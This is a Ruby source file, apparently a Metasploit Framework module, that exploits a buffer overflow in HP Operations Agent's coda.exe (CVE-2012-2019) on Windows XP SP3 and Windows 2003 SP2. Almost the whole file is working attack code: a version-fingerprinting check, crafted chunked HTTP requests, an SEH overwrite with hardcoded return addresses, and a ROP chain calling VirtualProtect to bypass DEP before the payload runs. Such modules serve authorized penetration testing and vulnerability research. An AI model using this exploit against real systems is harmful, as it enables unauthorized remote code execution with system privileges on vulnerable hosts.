# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::Seh

  def initialize
    super(
      &#039;Name&#039;        => &#039;HP Operations Agent Opcode coda.exe 0x34 Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a buffer overflow vulnerability in HP Operations Agent for
        Windows. The vulnerability exists in the HP Software Performance Core Program
        component (coda.exe) when parsing requests for the 0x34 opcode. This module has
        been tested successfully on HP Operations Agent 11.00 over Windows XP SP3 and
        Windows 2003 SP2 (DEP bypass).

        The coda.exe components runs only for localhost by default, network access must be
        granted through its configuration to be remotely exploitable. On the other hand it
        runs on a random TCP port, to make easier reconnaissance a check function is
        provided.
      },
      &#039;Author&#039;      => [
        &#039;Luigi Auriemma&#039;, # Vulnerability discovery
        &#039;juan vazquez&#039; # Metasploit module
      ],
      &#039;Platform&#039;    => &#039;win&#039;,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2012-2019&#039; ],
          [ &#039;OSVDB&#039;, &#039;83673&#039; ],
          [ &#039;BID&#039;, &#039;54362&#039; ],
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-114/&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;          => 1024,
          &#039;BadChars&#039;       => "",
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff", # Stack adjustment # add esp, -3500
          &#039;DisableNops&#039;    => true
        },
      &#039;Targets&#039;     =>
        [
          [ &#039;HP Operations Agent 11.00 / Windows XP SP3&#039;,
            {
              &#039;Ret&#039;    => 0x100e79eb, # ppr from OvSecCore.dll
              &#039;Offset&#039; => 2084
            }
          ],
          [ &#039;HP Operations Agent 11.00 / Windows 2003 SP2&#039;,
            {
              &#039;Ret&#039;       => 0x10073c2c, # stackpivot # ADD ESP,404 # RETN from OvSecCore.dll
              &#039;Offset&#039;    => 2084,
              &#039;RopOffset&#039; => 36
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 1,
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Jul 09 2012&#039;
    )

  end

  def junk(n=4)
    return rand_text_alpha(n).unpack("V")[0].to_i
  end

  def nop
    return make_nops(4).unpack("V")[0].to_i
  end

  def check

    res = ping

    if not res
      return Exploit::CheckCode::Unknown
    end

    if res !~ /HTTP\/1\.1 200 OK/
      return Exploit::CheckCode::Unknown
    end

    if res =~ /server:.*coda 11.(\d+)/
      minor = $1.to_i
      if minor < 2
        return Exploit::CheckCode::Vulnerable
      else
        return Exploit::CheckCode::Safe
      end
    end

    if res =~ /server:.*coda/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe

  end

  def ping

    ping_request = <<-eos
Ping /Hewlett-Packard/OpenView/BBC/ping/ HTTP/1.1
cache-control: no-cache
connection: close
content-length: 0
content-type: application/octetstream
host: #{rhost}:#{rport}
pragma: no-cache
targetid: unknown
targeturi: http://#{rhost}:#{rport}/Hewlett-Packard/OpenView/BBC/ping/
user-agent: BBC 11.00.044; coda unknown version

    eos

    connect
    sock.put(ping_request)
    res = sock.get_once(-1, 1)
    disconnect

    return res

  end

  def exploit

    peer = "#{rhost}:#{rport}"

    print_status "#{peer} - Ping host..."
    res = ping
    if not res or res !~ /HTTP\/1\.1 200 OK/ or res !~ /server:.*coda/
      print_error("#{peer} - Host didn&#039;t answer correctly to ping")
      return
    end

    connect

    http_headers = <<-eos
GET /Hewlett-Packard/OpenView/Coda/ HTTP/1.1
cache-control: no-cache
content-type: application/octetstream
expect: 100-continue
host: #{rhost}:#{rport}
pragma: no-cache
targetid: unknown
targeturi: http://[#{rhost}]:#{rport}/Hewlett-Packard/OpenView/Coda/
transfer-encoding: chunked
user-agent: BBC 11.00.044;  14

    eos

    print_status("#{peer} - Sending HTTP Expect...")
    sock.put(http_headers)
    res = sock.get_once(-1, 1)
    if not res or res !~ /HTTP\/1\.1 100 Continue/
      print_error("#{peer} - Failed while sending HTTP Expect Header")
      return
    end

    coda_request = [
      0x0000000e,
      0xffffffff,
      0x00000000,
      0x00000034, # Operation 0x8c
      0x00000002,
      0x00000002
    ].pack("N*")

    if target.name =~ /Windows XP/
      bof = rand_text(target[&#039;Offset&#039;])
      bof << generate_seh_record(target.ret)
      bof << payload.encoded
      bof << rand_text(4000) # Allows to trigger exception
    else # Windows 2003
      rop_gadgets =
        [
          0x77bb2563, # POP EAX # RETN
          0x77ba1114, # <- *&VirtualProtect()
          0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
          junk,
          0x77bb0c86, # XCHG EAX,ESI # RETN
          0x77bc9801, # POP EBP # RETN
          0x77be2265, # ptr to &#039;push esp #  ret&#039;
          0x77bb2563, # POP EAX # RETN
          0x03C0990F,
          0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)
          0x77bb48d3, # POP EBX, RET
          0x77bf21e0, # .data
          0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
          0x77bbfc02, # POP ECX # RETN
          0x77bef001, # W pointer (lpOldProtect) (-> ecx)
          0x77bd8c04, # POP EDI # RETN
          0x77bd8c05, # ROP NOP (-> edi)
          0x77bb2563, # POP EAX # RETN
          0x03c0984f,
          0x77bdd441, # SUB EAX, 03c0940f
          0x77bb8285, # XCHG EAX,EDX # RETN
          0x77bb2563, # POP EAX # RETN
          nop,
          0x77be6591, # PUSHAD # ADD AL,0EF # RETN
        ].pack("V*")
      bof = Rex::Text.pattern_create(target[&#039;RopOffset&#039;])
      bof << rop_gadgets
      bof << payload.encoded
      my_payload_length =  target[&#039;RopOffset&#039;] + rop_gadgets.length + payload.encoded.length
      bof << rand_text(target[&#039;Offset&#039;] - my_payload_length)
      bof << generate_seh_record(target.ret)
      bof << rand_text(4000) # Allows to trigger exception
    end

    coda_request << [bof.length].pack("n")
    coda_request << bof

    http_body = coda_request.length.to_s(16)
    http_body << "\x0d\x0a"
    http_body << coda_request
    http_body << "\x0d\x0a\x0d\x0a"

    print_status("#{peer} - Triggering overflow...")
    sock.put(http_body)

    disconnect
  end

end

